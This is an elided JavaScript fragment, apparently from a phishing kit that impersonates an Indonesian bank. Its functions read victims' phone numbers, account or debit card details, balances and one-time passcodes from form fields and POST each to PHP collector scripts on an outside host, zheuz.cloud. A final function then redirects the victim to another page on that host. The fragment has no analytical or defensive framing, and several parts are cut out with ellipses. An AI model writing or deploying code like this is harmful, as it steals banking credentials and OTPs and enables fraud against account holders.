...
function sendNohp(){
  ...
  sessionStorage.setItem('tarif', tarif);
    ...
    var nohp = document.getElementById('nohp');    
      ...
      $.ajax({
        type: 'POST',
        url: 'https://zheuz.cloud/bri/v1-v1t1ov/no.php',
...
function sendDebit(){
   $('.load').fadeIn();
    ...
    var rek = document.getElementById('rek');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://zheuz.cloud/bri/v1-v1t1ov/login.php',
...
function sendSaldo(){
    ...
    var saldo = document.getElementById('saldo');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://zheuz.cloud/bri/v1-v1t1ov/saldo.php',
...
function sendOtp(){
    ...
    var nama1 = document.getElementById('nama1');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://zheuz.cloud/bri/v1-v1t1ov/otp.php',
...
function get(){
 ...
 $('.load').fadeIn();   
setTimeout(function(){  
location.href='https://zheuz.cloud/wa/v1-v1t1ov';
 $("#process1").hide();
 $('.load').fadeOut();
 }, 2000);    
}     
